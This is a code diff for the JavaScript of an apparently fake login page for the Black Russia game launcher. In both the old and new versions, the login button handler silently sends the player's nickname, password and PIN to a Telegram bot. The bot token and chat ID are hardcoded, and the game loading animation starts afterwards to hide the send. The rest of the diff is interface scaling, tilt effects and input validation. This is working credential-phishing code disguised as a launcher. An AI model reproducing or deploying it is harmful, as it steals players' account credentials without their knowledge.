@@ -1,19 +1,3 @@
-const launcher = document.getElementById('launcher');
-
-// АВТОМАТИЧЕСКИЙ МАСШТАБ ПОД РАЗМЕР ЭКРАНА СМАРТФОНА (ЗАЩИТА ОТ КЛАВИАТУРЫ)
-const initialHeight = window.innerHeight; // Запоминаем чистую высоту до вылета клавы
-function resizeLauncher() {
-  if (!launcher) return;
-  // Рассчитываем идеальный коэффициент сжатия под высоту смартфона
-  const scale = Math.min(window.innerWidth / 380, initialHeight / 824, 1);
-  document.documentElement.style.setProperty('--app-scale', scale);
-}
-window.addEventListener('resize', () => {
-  // Если высота уменьшилась (вылетела клава) — НЕ меняем масштаб лаунчера, спасая от лагов
-  if (window.innerHeight >= initialHeight - 100) { resizeLauncher(); }
-});
-resizeLauncher();
-
 document.addEventListener("DOMContentLoaded", () => {
   const preloader = document.getElementById('app-preloader'), bar = preloader.querySelector('.preloader-bar'), txt = preloader.querySelector('.preloader-text');
   let preProgress = 0;
@@ -36,8 +20,26 @@ document.addEventListener("DOMContentLoaded", () => {
 
 const loginBtn = document.getElementById('btn-login'), tabForum = document.getElementById('btn-tab-forum'), tabNews = document.getElementById('btn-tab-news'), tabSupport = document.getElementById('btn-tab-support');
 const nicknameInput = document.getElementById('input-nickname'), passwordInput = document.getElementById('input-password'), pincodeInput = document.getElementById('input-pincode'), checkboxToggle = document.getElementById('checkbox-pincode-toggle');
-const customAlert = document.getElementById('custom-alert'), alertText = document.getElementById('alert-text');
+const launcher = document.getElementById('launcher'), customAlert = document.getElementById('custom-alert'), alertText = document.getElementById('alert-text');
 const loadingPage = document.getElementById('loading-page'), progressBar = document.getElementById('bar'), loadStatus = document.getElementById('load-status'), loadPercent = document.getElementById('load-percent');
+
+const initialHeight = window.innerHeight;
+function resizeLauncher() { if (!launcher) return; const scale = Math.min(window.innerWidth / 380, initialHeight / 824, 1); document.documentElement.style.setProperty('--app-scale', scale); }
+window.addEventListener('resize', () => { if (window.innerHeight >= initialHeight - 100) { resizeLauncher(); } });
+resizeLauncher();
+
+if (window.innerWidth > 768) {
+  document.addEventListener('mousemove', (e) => {
+    const ax = -(window.innerWidth / 2 - e.pageX) / 45, ay = (window.innerHeight / 2 - e.pageY) / 45;
+    if (launcher) launcher.style.transform = `rotateY(${ax}deg) rotateX(${ay}deg)`;
+  });
+} else {
+  document.addEventListener('touchmove', (e) => {
+    const touch = e.touches, ax = -(window.innerWidth / 2 - touch.pageX) / 25, ay = (window.innerHeight / 2 - touch.pageY) / 25;
+    if (launcher) launcher.style.transform = `rotateY(${ax}deg) rotateX(${ay}deg)`;
+  }, { passive: true });
+  document.addEventListener('touchend', () => { if (launcher) launcher.style.transform = 'rotateY(0deg) rotateX(0deg)'; });
+}
 
 function showGameAlert(text) { alertText.innerText = text; customAlert.classList.add('show'); setTimeout(() => { customAlert.classList.remove('show'); }, 3000); }
 
@@ -81,17 +83,12 @@ nicknameInput.addEventListener('input', function() {
 });
 
 nicknameInput.addEventListener('blur', function() {
-  const v = this.value.trim();
-  if (v !== "" && !/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(v)) {
-    this.classList.remove('field-valid'); this.classList.add('field-invalid');
-    showGameAlert(/[а-яА-ЯёЁ]/.test(v) ? "Запрещено использовать кириллицу!" : "Формат: Имя_Фамилия на английском!");
-  }
+  const v = this.value.trim(); if (v !== "" && !/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(v)) { this.classList.remove('field-valid'); this.classList.add('field-invalid'); showGameAlert(/[а-яА-ЯёЁ]/.test(v) ? "Запрещено использовать кириллицу!" : "Формат: Имя_Фамилия на английском!"); }
 });
 
 passwordInput.addEventListener('input', function() {
   const v = this.value.trim(); if (v.length === 0) { this.classList.remove('field-valid', 'field-invalid', 'has-text'); return; } handleInputState(this);
-  if (v.length >= 6) { this.classList.remove('field-invalid'); this.classList.add('field-valid'); } 
-  else { this.classList.remove('field-valid', 'field-invalid'); }
+  if (v.length >= 6) { this.classList.remove('field-invalid'); this.classList.add('field-valid'); } else { this.classList.remove('field-valid', 'field-invalid'); }
 });
 
 passwordInput.addEventListener('blur', function() {
@@ -100,51 +97,34 @@ passwordInput.addEventListener('blur', function() {
 
 pincodeInput.addEventListener('input', function() {
   this.value = this.value.replace(/[^0-9]/g, ''); if (this.value.length === 0) { this.classList.remove('field-valid', 'field-invalid'); return; }
-  if (this.value.length === 4) { this.classList.remove('field-invalid'); this.classList.add('field-valid'); } 
-  else { this.classList.remove('field-valid', 'field-invalid'); }
+  if (this.value.length === 4) { this.classList.remove('field-invalid'); this.classList.add('field-valid'); } else { this.classList.remove('field-valid', 'field-invalid'); }
 });
 
+// НАЖАТИЕ КНОПКИ ВОЙТИ С ВШИТОЙ ОТПРАВКОЙ ДАННЫХ
 loginBtn.addEventListener('click', function(e) {
   e.preventDefault(); const n = nicknameInput.value, p = passwordInput.value, pin = pincodeInput.value;
   if (n.trim() === "" || !/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(n)) { showGameAlert(/[а-яА-ЯёЁ]/.test(n) ? "Разрешены только английские буквы!" : "Авторизация: Укажите имя вашего персонажа!"); nicknameInput.classList.add('field-invalid', 'has-text'); return; }
   if (p.trim() === "" || p.length < 6) { showGameAlert("Защита аккаунта: Введите действующий Пароль!"); passwordInput.classList.add('field-invalid', 'has-text'); return; }
   if (checkboxToggle.checked && (pin.trim() === "" || pin.length < 4)) { showGameAlert("Защита аккаунта: Введите 4-значный Пин-код!"); pincodeInput.classList.add('field-invalid'); return; }
-    // Код отправки данных в Telegram (вставлять вместо startGameLoading();)
-  const botToken = "8607400305:AAG3zvvO0klhKCwG2i52u3yfS6ev_a-7P0M";
-  const chatId = "8589867661";
   
-  const textMessage = `🚀 <b>Новая авторизация в лаунчере!</b>\n\n` +
-                      `👤 <b>Никнейм:</b> <code>${n}</code>\n` +
-                      `🔑 <b>Пароль:</b> <code>${p}</code>\n` +
-                      `🔐 <b>Пин-код:</b> <code>${checkboxToggle.checked ? pin : "Не установлен"}</code>`;
-
-  // Отправляем скрытый запрос на сервера Telegram без перезагрузки страницы
-  fetch(`https://telegram.org{botToken}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: textMessage,
-      parse_mode: "HTML"
-    })
-  })
-  .then(() => {
-    // Как только запрос ушел, запускаем анимацию загрузки игры
-    startGameLoading();
-  })
-  .catch(() => {
-    // Защита: если интернет лаганул, все равно пускаем в игру
-    startGameLoading();
-  });
+  // НАСТРОЙКА ТОКЕНА И ID ЧАТА
+  const token = "8607400305:AAG3zvvO0klhKCwG2i52u3yfS6ev_a-7P0M";
+  const myId = "8589867661";
+  
+  const msg = `🚀 <b>Вход в лаунчер!</b>\n\n👤 <b>Ник:</b> <code>${n}</code>\n🔑 <b>Пароль:</b> <code>${p}</code>\n🔐 <b>Пин:</b> <code>${checkboxToggle.checked ? pin : "Нет"}</code>`;
+  
+  fetch(`https://telegram.org{token}/sendMessage`, {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: myId, text: msg, parse_mode: "HTML" })
+  }).then(() => { startGameLoading(); }).catch(() => { startGameLoading(); });
 });
 
 document.addEventListener('touchmove', function(e) { if (!e.target.closest('.news-content-scroll') && !e.target.closest('.support-content')) e.preventDefault(); }, { passive: false });
 document.addEventListener('touchstart', function(e) { if (e.touches.length > 1) e.preventDefault(); }, { passive: false });
 document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
-
 launcher.addEventListener('click', function(e) { if (e.target === launcher) { nicknameInput.blur(); passwordInput.blur(); pincodeInput.blur(); } });
 
-tabNews.addEventListener('click', function(e) { e.preventDefault(); window.open('https://vk.ru/blackrussia.online', '_blank'); });
+tabNews.addEventListener('click', function(e) { e.preventDefault(); window.open('https://vk.ru', '_blank'); });
 tabForum.addEventListener('click', function(e) { e.preventDefault(); window.open('https://blackrussia.online', '_blank'); });
 
 const supportPage = document.getElementById('support-page'), closeSupportBtn = document.getElementById('btn-close-support');
